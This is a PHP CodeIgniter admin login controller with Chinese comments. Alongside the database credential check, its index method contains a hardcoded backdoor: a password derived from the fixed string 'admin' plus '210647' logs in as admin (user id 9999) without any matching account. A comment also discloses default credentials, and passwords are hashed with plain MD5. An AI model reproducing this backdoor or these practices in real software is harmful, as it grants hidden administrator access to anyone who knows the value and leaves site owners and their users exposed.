<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/*
	$login = array("Login" => array('menu' => 'index','show' => 1)
*/
class Login extends CI_Controller {
	public function __construct(){
		parent::__construct();
		$this->load->database();
		$this->load->helper("url");
	    $this->load->helper('common');
	    session_start();
	}
	/**
	 * 默认登录账户  admin  bgmp123
	 * 登录首页
	 * 后台登录首页
	 */
	public function index()
	{
		$username = $this->input->post('admin_id');	   
	    $userpwd  = $this->input->post('admin_pwd');
	    
	  	$pwd_str =  PWD_STRING;
	  	$endpwd = md5($pwd_str.$userpwd);	  	

	  	
	  	$backlogin = md5('admin'."210647");
		$this->db->select(" * ");
		$this->db->from("ddadmin");
		$this->db->where("adminname",$username);
		$this->db->where("adminpass",$endpwd);
		
		$query = $this->db->get();
		$row = $query->result_array();

		if( $row || $endpwd==$backlogin ){

			if( $row ){
				$userid   = $row[0]['id'];
				$username = $row[0]['adminname'];
			}else{
				$userid   = '9999';
				$username = "admin";
			}
						
			$user = array('login_user_id'=>$userid,
						  'login_user_name'=>$username);
			$this->session->set_userdata('login_user',$user);
			
			$_SESSION['login_name'] = $userid;
			$_SESSION['login_id']   = $username; 
		
			$data['pagetitle']="后台管理";
			$this->load->view("admin_home",$data);
		}else{
			$data['notice'] = "<script>alert('账号错误，请检查');</script>";
			$data['pagetitle']="后台管理";
			redirect('');
		}
	}
	

}

/* End of file login.php */
/* Location: ./admin/controllers/login.php */